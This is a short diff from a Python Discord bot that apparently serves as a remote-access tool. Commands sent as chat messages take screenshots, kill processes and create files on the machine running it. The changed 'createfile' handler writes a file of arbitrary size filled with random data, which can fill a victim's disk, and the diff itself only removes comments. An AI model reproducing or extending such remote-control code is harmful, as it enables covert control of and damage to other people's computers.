@@ -1031,18 +1031,14 @@ screenshot done, see attached file
 			await message.reply(await femboyaccess("taskkill", "could not kill the process! :c"))
 	    if message.content.startswith("createfile"):
 	        try:
-	            # Split the message to get the filename and size (in MB)
 	            args = message.content.split(" ")
 	            filename = args[1]
 	            size_mb = int(args[2])
 	
-	            # Calculate size in bytes (1 MB = 1024 * 1024 bytes)
 	            size_bytes = size_mb * 1024 * 1024
 	
-	            # Create the file with the specified size
 	            with open(filename, 'wb') as f:
-	                f.write(os.urandom(size_bytes))  # Writing random data to fill the file
-	
+	                f.write(os.urandom(size_bytes))  
 	            await message.reply(f"File '{filename}' of size {size_mb} MB created successfully!")
 	
 	        except Exception as e:
